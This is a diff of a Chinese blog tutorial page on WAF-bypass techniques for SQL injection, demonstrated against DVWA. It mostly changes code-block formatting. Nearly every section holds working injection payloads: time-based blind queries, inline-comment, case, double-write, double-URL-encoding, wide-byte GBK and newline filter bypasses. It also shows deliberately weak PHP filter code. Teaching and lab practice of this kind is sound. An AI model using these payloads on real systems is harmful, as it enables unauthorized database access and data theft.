 </h4><p>mysql数据库还有一个特性：</p>
@@ -1809,10 +1809,10 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </ul>
 <p>如果我们想要在字符型进行空格的括号绕过，可以使用()把and后面的表达式包裹起来（前提是有返回值）</p>
 <p><strong>上文提到的<code>sleep()</code>函数其实是有返回值的，执行成功为1，失败为0，因此可以使用()包裹：</strong></p>
-<pre tabindex="0"><code>1&#39;and(sleep((ascii(substring(database(),1,1))=100)+4))#
-</code></pre><p><strong>而if()函数的返回值则取决于我们写在if里面的函数：</strong></p>
-<pre tabindex="0"><code>1&#39;and(if(length(database())=4,sleep(5),1))#
-</code></pre><p>效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39;and(sleep((ascii(substring(database(),1,1))=100)+4))#
+</span></span></code></pre></div><p><strong>而if()函数的返回值则取决于我们写在if里面的函数：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39;and(if(length(database())=4,sleep(5),1))#
+</span></span></code></pre></div><p>效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型</p>
 <p>如果逗号被过滤，一般也要使用括号绕过：<a class="link" href="#%e7%bb%95%e8%bf%87%e5%87%bd%e6%95%b0%e5%8f%82%e6%95%b0%e4%b8%ad%e7%9a%84%e9%80%97%e5%8f%b7" >逗号绕过——绕过函数参数中的逗号
     
 </a></p>
@@ -1820,8 +1820,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </h2><h3 id="绕过特定屏蔽词">绕过特定屏蔽词
 </h3><p><strong>为了保持和其他数据库的兼容，mysql数据库会执行放在<code>/*!...*/</code>里面的语句</strong></p>
 <p>这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在<code>/*!...*/</code>里，比如：</p>
-<pre tabindex="0"><code>1&#39; union/*!select*/ 1,2 #
-</code></pre><p><strong>WAF会把它看成&quot;带有奇怪符号的注释&quot;而放行，但是到了mysql环境里，就能被执行：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union/*!select*/ 1,2 #
+</span></span></code></pre></div><p><strong>WAF会把它看成&quot;带有奇怪符号的注释&quot;而放行，但是到了mysql环境里，就能被执行：</strong></p>
 <p><img src="http://picture.928330.xyz/typora/image-20250629194535907.png"
 	
 	
@@ -1834,15 +1834,15 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 ></p>
 <p><strong>我们还可以在<code>/*!...*/</code>里面加上版本号：<code>/*!50001...*/</code>，表示数据库是5.00.01及以上版本，该语句才会被执行</strong></p>
 <p>我使用的dvwa的mysql版本是5.5.53，如果使用<code>1' union/*!60001select*/ 1,2 #</code>，就会报版本错：</p>
-<pre tabindex="0"><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1,2 #&#39;&#39; at line 1
-</code></pre><h3 id="干扰waf过滤">干扰WAF过滤
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1,2 #&#39;&#39; at line 1
+</span></span></code></pre></div><h3 id="干扰waf过滤">干扰WAF过滤
 </h3><p>有的WAF过滤覆盖的范围可能不够大，比如会过滤掉<code>order by</code>，但是如果在中间加上<code>/*!10440*/</code>：</p>
-<pre tabindex="0"><code>1&#39; or 1=1 order/*!10440*/by 1#
-</code></pre><p>这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：</p>
-<pre tabindex="0"><code>1&#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1#
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; or 1=1 order/*!10440*/by 1#
+</span></span></code></pre></div><p>这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：</p>
+<pre tabindex="0"><code class="language-texttext" data-lang="texttext">1&#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1#
 </code></pre><p>或者干脆使用普通的注释干扰：</p>
-<pre tabindex="0"><code>1&#39; or 1=1 order/*%%!asd%%%%*/by 1#
-</code></pre><h2 id="3-大小写绕过">#3 大小写绕过
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; or 1=1 order/*%%!asd%%%%*/by 1#
+</span></span></code></pre></div><h2 id="3-大小写绕过">#3 大小写绕过
 </h2><p>有的WAF只针对小写的（或者大写的）查询语句做了过滤：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>];
 </span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">strpos</span>(<span style="color:#e06c75">$id</span>, <span style="color:#98c379">&#39;union&#39;</span>) <span style="color:#56b6c2">!&lt;</span><span style="color:#e06c75">mark</span><span style="color:#56b6c2">&gt;</span> <span style="color:#c678dd">false</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">strpos</span>(<span style="color:#e06c75">$id</span>, <span style="color:#98c379">&#39;select&#39;</span>) <span style="color:#56b6c2">!&lt;/</span><span style="color:#e06c75">mark</span><span style="color:#56b6c2">&gt;</span> <span style="color:#c678dd">false</span>) {
@@ -1850,27 +1850,27 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
 </span></span></code></pre></div><p><strong>然而很多sql数据库是不区分大小写的</strong>，我们就可以大小写交错写来绕过：</p>
-<pre tabindex="0"><code>1&#39; uNiOn sElEcT 1,database()#
-</code></pre><h2 id="4-双写绕过">#4 双写绕过
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; uNiOn sElEcT 1,database()#
+</span></span></code></pre></div><h2 id="4-双写绕过">#4 双写绕过
 </h2><p>部分WAF所做的工作只是简单的把不允许出现的查询内容（比如sql语句）替换成空字符串：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id_sanitized</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">str_replace</span>(<span style="color:#c678dd">array</span>(<span style="color:#98c379">&#39;union&#39;</span>, <span style="color:#98c379">&#39;select&#39;</span>), <span style="color:#98c379">&#39;&#39;</span>, <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]; );
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id_sanitized</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>; 
 </span></span></code></pre></div><p>这种过滤方式是很不可靠的，因为就算有危险内容，<strong>简陋过滤之后剩下的部分仍然会进入查询（一次过滤）</strong></p>
 <p>我们就可以通过&quot;双写&quot;，<strong>比如<code>selselectect</code>，替换中间的<code>select</code>为空后，剩下的部分仍然是<code>select</code>：</strong></p>
-<pre tabindex="0"><code>1&#39; uniunionon selselectect 1,2#
-</code></pre><p>过滤器替换后：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; uniunionon selselectect 1,2#
+</span></span></code></pre></div><p>过滤器替换后：</p>
 <pre tabindex="0"><code>1&#39; union select 1,2#
 </code></pre><h2 id="5-编码绕过">#5 编码绕过
 </h2><p>如果WAF针对关键词进行了区分大小写的过滤，这时候就不能通过大小写和双写蒙混过关了</p>
 <p><strong>不过根据WAF一次过滤的特点，我们还是利用各种编码构造出payload</strong></p>
 <h3 id="双重url编码绕过">双重URL编码绕过
 </h3><p><strong>因为上传的payload只会url解析一次，我们把部分字符再次进行url编码：</strong></p>
-<pre tabindex="0"><code>1&#39; union se%256cect 1,database()#
-</code></pre><p>WAF部分(<code>%25</code> -&gt; <code>%</code>)看见的内容是：</p>
-<pre tabindex="0"><code>1&#39; union se%6cect 1,database()#
-</code></pre><p>执行部分(<code>%6c</code> -&gt; <code>l</code>)看见的是：</p>
-<pre tabindex="0"><code>1&#39; union select 1,database()#
-</code></pre><p>这就成功传入了目标语句</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union se%256cect 1,database()#
+</span></span></code></pre></div><p>WAF部分(<code>%25</code> -&gt; <code>%</code>)看见的内容是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union se%6cect 1,database()#
+</span></span></code></pre></div><p>执行部分(<code>%6c</code> -&gt; <code>l</code>)看见的是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,database()#
+</span></span></code></pre></div><p>这就成功传入了目标语句</p>
 <p>附上一张url编码表：</p>
 <p><img src="http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png"
 	
@@ -1884,10 +1884,10 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 ></p>
 <h3 id="十六进制unicode编码ascii编码绕过">十六进制、Unicode编码、ASCII编码绕过
 </h3><p>其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：</p>
-<pre tabindex="0"><code>1%ef%bc%87 or 1=1#
-</code></pre><p>部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符<code>＇</code>：</p>
-<pre tabindex="0"><code>1＇ OR 1=1
-</code></pre><p>当然你也能直接输入全角试试能不能绕过，这里只是举一个例子</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1%ef%bc%87 or 1=1#
+</span></span></code></pre></div><p>部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符<code>＇</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1＇ OR 1=1
+</span></span></code></pre></div><p>当然你也能直接输入全角试试能不能绕过，这里只是举一个例子</p>
 <p>其他方式大同小异，这里不多赘述</p>
 <h2 id="6-等价代替绕过">#6 等价代替绕过
 </h2><p><strong>WAF限制了某一些的符号、语句或者函数，但我们可以设法找到功能一样或相似的来代替</strong></p>
@@ -1902,23 +1902,23 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 <li><strong><code>between</code>：<code>expr between 下界 and 上界</code>，表示是否<code>expr &gt;= 下界 &amp;&amp; exp &lt;= 上界</code>，上下界可以相等</strong></li>
 </ul>
 <p>如果WAF过滤了=，我们可以使用他们实现相同目的：</p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;#
-</code></pre><p>使用<code>like</code>匹配：</p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like &#39;users&#39;#
-</code></pre><p>使用<code>in</code>匹配（<strong>注意in匹配的对象要是一个组</strong>）：</p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (&#39;users&#39;)#
-</code></pre><p>使用<code>rlike</code>/<code>regexp</code>匹配：</p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike &#39;users&#39;#
-</code></pre><p>使用between判断：</p>
-<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between &#39;users&#39; and &#39;users&#39;#
-</code></pre><h4 id="大于号和小于号过滤绕过">大于号(&gt;)和小于号(&lt;)过滤绕过
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;#
+</span></span></code></pre></div><p>使用<code>like</code>匹配：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like &#39;users&#39;#
+</span></span></code></pre></div><p>使用<code>in</code>匹配（<strong>注意in匹配的对象要是一个组</strong>）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (&#39;users&#39;)#
+</span></span></code></pre></div><p>使用<code>rlike</code>/<code>regexp</code>匹配：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike &#39;users&#39;#
+</span></span></code></pre></div><p>使用between判断：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between &#39;users&#39; and &#39;users&#39;#
+</span></span></code></pre></div><h4 id="大于号和小于号过滤绕过">大于号(&gt;)和小于号(&lt;)过滤绕过
 </h4><p>使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找</p>
 <p>如果无法使用比较操作符，那么就需要使用到greatest()和least()来进行绕过了</p>
 <p><mark><strong>greatest(n1,n2,n3,&hellip;)函数返回输入参数(n1,n2,n3,&hellip;)的最大值，least()则是返回最小值：</strong></mark></p>
-<pre tabindex="0"><code>1&#39; and greatest(ascii(substr(database(),0,1)),64)=64
-</code></pre><p>等价于：</p>
-<pre tabindex="0"><code>1&#39; and ascii(substr(database(),0,1))&gt;64
-</code></pre><h4 id="and和or过滤绕过">and和or过滤绕过
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and greatest(ascii(substr(database(),0,1)),64)=64
+</span></span></code></pre></div><p>等价于：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and ascii(substr(database(),0,1))&gt;64
+</span></span></code></pre></div><h4 id="and和or过滤绕过">and和or过滤绕过
 </h4><div class="table-wrapper"><table>
   <thead>
       <tr>
@@ -1947,27 +1947,27 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </table></div>
 <h3 id="注释符号过滤">注释符号过滤
 </h3><p><strong>如果WAF过滤了<code>#</code>和<code>-- </code> ，我们可以使用另一个<code>'</code>闭合后面的<code>'</code>：</strong></p>
-<pre tabindex="0"><code>1&#39; union select 1,2 or &#39;1
-</code></pre><p>或者</p>
-<pre tabindex="0"><code>1&#39; union select 1,&#39;2
-</code></pre><h3 id="逗号过滤">逗号过滤
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,2 or &#39;1
+</span></span></code></pre></div><p>或者</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,&#39;2
+</span></span></code></pre></div><h3 id="逗号过滤">逗号过滤
 </h3><h4 id="绕过limit中的逗号">绕过limit中的逗号
 </h4><p>在进行盲注时，我们经常需要逐行读取数据，会用到<code>limit m, n</code></p>
 <p><mark><strong>可以使用limit m offset n代替，表示取m行，跳过n行：</strong></mark></p>
-<pre tabindex="0"><code>1&#39; union select 1,database() limit 1 offset 0 #
-</code></pre><p>等价于</p>
-<pre tabindex="0"><code>1&#39; union select 1,database() limit 0,1 #
-</code></pre><h4 id="绕过函数参数中的逗号">绕过函数参数中的逗号
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,database() limit 1 offset 0 #
+</span></span></code></pre></div><p>等价于</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,database() limit 0,1 #
+</span></span></code></pre></div><h4 id="绕过函数参数中的逗号">绕过函数参数中的逗号
 </h4><p>很多函数需要多个参数，用逗号隔开，例如<code>substring(string, m, n)</code></p>
 <p><mark><strong>可以使用substring(stringfrom m for n)代替：</strong></mark></p>
-<pre tabindex="0"><code>1&#39; and substring(database()from 1 for 1)=&#39;d&#39; #
-</code></pre><p><strong>如果空格被过滤了，可以使用()包裹from和for后面的数字：</strong></p>
-<pre tabindex="0"><code>1&#39; and substring(database()from(1)for(1))=&#39;d&#39; #
-</code></pre><h4 id="绕过select列表中的逗号">绕过select列表中的逗号
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and substring(database()from 1 for 1)=&#39;d&#39; #
+</span></span></code></pre></div><p><strong>如果空格被过滤了，可以使用()包裹from和for后面的数字：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and substring(database()from(1)for(1))=&#39;d&#39; #
+</span></span></code></pre></div><h4 id="绕过select列表中的逗号">绕过select列表中的逗号
 </h4><p>union联合查询注入时，我们经常需要一次性查询多个列，如<code>union select user, password</code></p>
 <p><mark><strong>可以使用join语句代替：</strong></mark></p>
-<pre tabindex="0"><code>1&#39; union select * from (select database())a join (select version())b#
-</code></pre><p>这段语句是如何工作的？我们逐一拆解：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select * from (select database())a join (select version())b#
+</span></span></code></pre></div><p>这段语句是如何工作的？我们逐一拆解：</p>
 <p><strong><code>(select database())a</code></strong>: 创建了一个只含一列（数据库名）的临时表，并别名为 <code>a</code></p>
 <p><strong><code>(select version())b</code></strong>: 创建了另一个只含一列（版本信息）的临时表，并别名为 <code>b</code></p>
 <p><strong><code>... a join b</code></strong>: 通过<code>join</code>将这两个只有一行一列的表连接起来，形成一个一行两列的新表</p>
@@ -2041,11 +2041,11 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 <h4 id="case-when语句代替if">case when语句代替if
 </h4><p><mark><strong>用法一：</strong></mark> <strong><code>case when exp1 then exp2 else exp3 end</code></strong></p>
 <p><strong>如果exp1为真就返回exp2，反之返回exp3</strong></p>
-<pre tabindex="0"><code>1&#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)#
-</code></pre><p><mark><strong>用法二：</strong></mark> <strong><code>case x when y then exp2 else exp3 end</code></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)#
+</span></span></code></pre></div><p><mark><strong>用法二：</strong></mark> <strong><code>case x when y then exp2 else exp3 end</code></strong></p>
 <p><strong>如果x=y则返回exp2，反之返回exp3</strong></p>
-<pre tabindex="0"><code>1&#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)#
-</code></pre><h4 id="reverseleft代替substring">reverse+left代替substring
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)#
+</span></span></code></pre></div><h4 id="reverseleft代替substring">reverse+left代替substring
 </h4><p><code>left</code>函数不能截取某一个精确的字符，但是结合<code>reverse</code>和<code>ascii</code>函数可以做到<code>substring+ascii</code>一样的效果：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">ascii</span>(<span style="color:#e06c75">reverse</span>(<span style="color:#e06c75">left</span>(<span style="color:#e06c75">string</span>, <span style="color:#e06c75">n</span>)))
 </span></span></code></pre></div><p><strong>这个组合可以做到取出string字符串第n位的ascii码</strong></p>
@@ -2095,16 +2095,16 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </span></span></code></pre></div><p><strong>返回的结果仍然是abcd，因为abcd的开头不是e</strong></p>
 <p><strong>利用这一点，我们就可以不直接比较字符是否相等，而是通过比较两次<code>trim()</code>操作的结果是否相同，来推断一个字符是否是目标字符串的开头</strong></p>
 <p><strong>第一次<code>trim()</code>：</strong></p>
-<pre tabindex="0"><code>(trim(leading &#39;a&#39; from database()) = (trim(leading &#39;b&#39; from database()))
-</code></pre><p>前者返回 <code>'dvwa'</code> （开头不是&rsquo;a&rsquo;）,后者返回 <code>'dvwa'</code> （开头也不是&rsquo;b&rsquo;）最终 <code>'dvwa' = 'dvwa'</code>，表达式为真</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>(<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;a&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()) <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;b&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()))
+</span></span></code></pre></div><p>前者返回 <code>'dvwa'</code> （开头不是&rsquo;a&rsquo;）,后者返回 <code>'dvwa'</code> （开头也不是&rsquo;b&rsquo;）最终 <code>'dvwa' = 'dvwa'</code>，表达式为真</p>
 <p>这样的话，我们就能判断数据库名称不是以a或者b开头，跳过这两个字母，继续往下尝试</p>
 <p><strong>第二次<code>trim()</code>：</strong></p>
-<pre tabindex="0"><code>(trim(leading &#39;c&#39; from database()) = (trim(leading &#39;d&#39; from database()))
-</code></pre><p>前者返回 <code>'dvwa'</code> （开头不是&rsquo;c&rsquo;）,后者返回 <code>'vwa'</code> （开头是&rsquo;d&rsquo;）最终 <code>'dvwa' = 'vwa'</code>，表达式为假</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>(<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;c&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()) <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;d&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()))
+</span></span></code></pre></div><p>前者返回 <code>'dvwa'</code> （开头不是&rsquo;c&rsquo;）,后者返回 <code>'vwa'</code> （开头是&rsquo;d&rsquo;）最终 <code>'dvwa' = 'vwa'</code>，表达式为假</p>
 <p>我们就能够判断，数据库名称是以c和d其中的一个字母开头，取其中一个字母，继续往下尝试</p>
 <p><strong>第三次<code>trim()</code>：</strong></p>
-<pre tabindex="0"><code>(trim(leading &#39;d&#39; from database()) = (trim(leading &#39;e&#39; from database()))
-</code></pre><p>表达式为<code>'vwa' = 'dvwa'</code>，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>(<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;d&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()) <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;e&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()))
+</span></span></code></pre></div><p>表达式为<code>'vwa' = 'dvwa'</code>，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头</p>
 <p>再结合上一次的判断结果，c和d中有一个是开头字母，就能确定是以d开头了</p>
 <p>如果这个表达式为假，说明d和e都不是，而c和d中有一个是，我们同样能以此确定是以c开头</p>
 <p>这样一位一位判断，就能凑出全貌</p>
@@ -2131,8 +2131,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 <li>
 <p><mark><strong>宽字节注入(1%df&rsquo;#)：</strong></mark></p>
 <p>攻击者提交<code>?id=1%df'#</code>，<code>check_addslashes</code>函数将<code>'</code>转义为<code>\'</code>，在url编码下变成：</p>
-<pre tabindex="0"><code>?id=1%df%5c%27#
-</code></pre><p><code>%5c</code>就是被添加进去的反斜杠<code>\</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>?id=1%df%5c%27#
+</span></span></code></pre></div><p><code>%5c</code>就是被添加进去的反斜杠<code>\</code></p>
 <p>请求到达MySQL服务器，由于连接是GBK编码，MySQL开始按照GBK规则解析字节流<code>0xdf 0x5c 0x27</code>：</p>
 <p><strong>MySQL首先读到<code>0xdf</code>，因为它在<code>0x81-0xFE</code>范围内，MySQL认为这是一个宽字符的开始</strong></p>
 <p><strong>随后，MySQL“吃掉”了紧随其后的<code>0x5c</code>（反斜杠<code>\</code>）作为这个宽字符的第二字节</strong></p>
@@ -2156,9 +2156,9 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 <p>元字符<code>.</code>可以匹配除换行符以外的任意单个字符，没有使用<code>s</code>修正符，所以 <code>.</code> 无法匹配换行符！</p>
 <p>而对于MySQL来说，换行符和空格、制表符一样，都是合法的空白分隔符</p>
 <p>所以，我们可以在查询语句里面插入换行符绕过：</p>
-<pre tabindex="0"><code>1&#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&#39;dvwa&#39; #
-												 ↑
-</code></pre><h2 id="9-多参数请求绕过双输入表单">#9 多参数请求绕过（双输入表单）
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&#39;dvwa&#39; #
+</span></span><span style="display:flex;"><span>												 ↑
+</span></span></code></pre></div><h2 id="9-多参数请求绕过双输入表单">#9 多参数请求绕过（双输入表单）
 </h2><h3 id="绕过间隔代码">绕过间隔代码
